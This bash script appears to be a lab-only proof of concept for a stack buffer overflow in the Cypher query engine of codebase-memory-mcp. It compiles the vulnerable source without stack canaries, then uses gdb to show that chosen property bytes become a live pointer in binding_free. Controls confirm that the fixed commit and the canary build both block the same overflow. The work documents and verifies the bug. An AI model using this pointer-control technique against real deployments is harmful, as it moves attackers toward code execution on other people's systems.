#!/usr/bin/env bash
# W23 lab-only probe: chosen property bytes become a live pointer when the
# pinned vulnerable source is compiled WITHOUT the stack canary. The pinned
# canary build still aborts (stack smash); the fixed pin still rejects N=40.
# This is a compiler-configuration rung-4 mechanic, not a claim about the
# shipped build, the wire, or rung 5. All processes and servers are local.
#
#   bash canary-off-pointer.sh [OUTDIR] > evidence/canary-off-pointer.txt
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE"
OUT="${1:-/tmp/cbm-canary-off}"
mkdir -p "$OUT" || exit 2
VULN="$HERE/src/codebase-memory-mcp-5554f8a46abf"
FIX="$HERE/src/codebase-memory-mcp-e69e0844dbc1c737ebd3d17e97007d0f5cf16beb"
FOUND=(
  src/foundation/arena.c src/foundation/hash_table.c src/foundation/str_intern.c
  src/foundation/log.c src/foundation/str_util.c src/foundation/platform.c
  src/foundation/system_info.c src/foundation/slab_alloc.c src/foundation/yaml.c
  src/foundation/compat.c src/foundation/compat_thread.c src/foundation/compat_fs.c
  src/foundation/compat_regex.c src/foundation/mem.c src/foundation/diagnostics.c
  src/foundation/profile.c src/foundation/dump_verify.c src/foundation/limits.c
  src/foundation/subprocess.c
)
pass=0
fail=0
ck() {
  if [ "$1" -eq 0 ]; then pass=$((pass+1)); echo "PASS: $2";
  else fail=$((fail+1)); echo "FAIL: $2"; fi
}
need() {
  if grep -Fq "$2" "$1"; then pass=$((pass+1)); echo "PASS: $3";
  else fail=$((fail+1)); echo "FAIL: $3"; fi
}

echo "=== pins $(date -u +%FT%TZ) ==="
sha256sum -c PINS.sha256
ck $? "4 pins hash-verified"

echo "=== builds $(date -u +%FT%TZ) ==="
(
  cd "$VULN" || exit 2
  gcc -std=c11 -g -O1 -fno-stack-protector -no-pie -w \
    -Ivendored/mimalloc/include -Ivendored/mimalloc/src -DMI_OVERRIDE=0 \
    -c vendored/mimalloc/src/static.c -o "$OUT/mimalloc.o" &&
  gcc -std=c11 -D_DEFAULT_SOURCE -g -O1 -fno-stack-protector -no-pie -w \
    -Iinternal/cbm -Iinternal/cbm/vendored/ts_runtime/include \
    -Iinternal/cbm/vendored/ts_runtime/src -c internal/cbm/ts_runtime.c \
    -o "$OUT/tsruntime.o"
)
ck $? "shared vendored objects built"

build() {  # tree, extra harness define, output
  ( cd "$1" || exit 2
    gcc -std=c11 -D_DEFAULT_SOURCE -D_GNU_SOURCE -g -O1 $2 \
      -fno-omit-frame-pointer -w -Isrc -Ivendored -Ivendored/sqlite3 \
      -Ivendored/mimalloc/include -Iinternal/cbm \
      -Iinternal/cbm/vendored/ts_runtime/include \
      -o "$3" "$HERE/pointer-probe.c" src/cypher/cypher.c src/store/store.c \
      "${FOUND[@]}" vendored/sqlite3/sqlite3.c vendored/yyjson/yyjson.c \
      "$OUT/mimalloc.o" "$OUT/tsruntime.o" -lm -lpthread -lz -lstdc++ )
}
build "$VULN" "-fno-stack-protector -no-pie" "$OUT/vuln-nocanary"
ck $? "vuln canary-off build"
build "$VULN" "-fno-stack-protector -no-pie -DALT_CHOSEN" "$OUT/vuln-nocanary-alt"
ck $? "vuln canary-off Z-bytes control build"
build "$FIX" "-fno-stack-protector -no-pie -DALT_CHOSEN" "$OUT/fixed-nocanary-alt"
ck $? "fixed canary-off build"
build "$VULN" "-DALT_CHOSEN" "$OUT/vuln-canary-alt"
ck $? "vuln canary-on control build"

echo "=== in-bounds control $(date -u +%FT%TZ) ==="
"$OUT/vuln-nocanary" 32 RETURN > "$OUT/n32.out" 2>&1
ck $? "N=32 canary-off clean rc=0"
need "$OUT/n32.out" "ITEMS=32 RC=0 ROWS=1 COLS=32" "N=32 returns 32 columns"

echo "=== chosen-byte pointer $(date -u +%FT%TZ) ==="
gdb -q -batch -ex 'set pagination off' -ex 'run 40 RETURN' -ex 'bt 2' \
  "$OUT/vuln-nocanary" > "$OUT/gdb-base.txt" 2>&1
need "$OUT/gdb-base.txt" 'binding_free (b=0x4e4d4c4b4a494847)' \
  'chosen "GHIJKLMN" is the live b pointer in binding_free'
need "$OUT/gdb-base.txt" 'execute_single' 'fault reached from real execute_single'

gdb -q -batch -ex 'set pagination off' -ex 'run 40 RETURN' -ex 'bt 2' \
  "$OUT/vuln-nocanary-alt" > "$OUT/gdb-alt.txt" 2>&1
need "$OUT/gdb-alt.txt" 'binding_free (b=0x5a5a5a5a5a5a5a5a)' \
  'changing property bytes to Z*8 changes the live pointer'

echo "=== fixed and canary controls $(date -u +%FT%TZ) ==="
"$OUT/fixed-nocanary-alt" 40 RETURN > "$OUT/fixed40.out" 2>&1
ck $? "fixed canary-off N=40 rc=0"
need "$OUT/fixed40.out" 'RC=-1 ROWS=0 COLS=0' "fixed pin rejects N=40"
need "$OUT/fixed40.out" 'failed to parse query' "fixed pin parse-time rejection"

"$OUT/vuln-canary-alt" 40 RETURN > "$OUT/canary40.out" 2>&1
canary_rc=$?
ck $([ "$canary_rc" -eq 134 ] && echo 0 || echo 1) "vuln canary-on N=40 aborts rc=134"
need "$OUT/canary40.out" 'stack smashing detected' "canary blocks the same overflow"

for f in n32.out gdb-base.txt gdb-alt.txt fixed40.out canary40.out; do
  echo "--- $f ---"
  cat "$OUT/$f"
done
echo "RESULT: PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ]
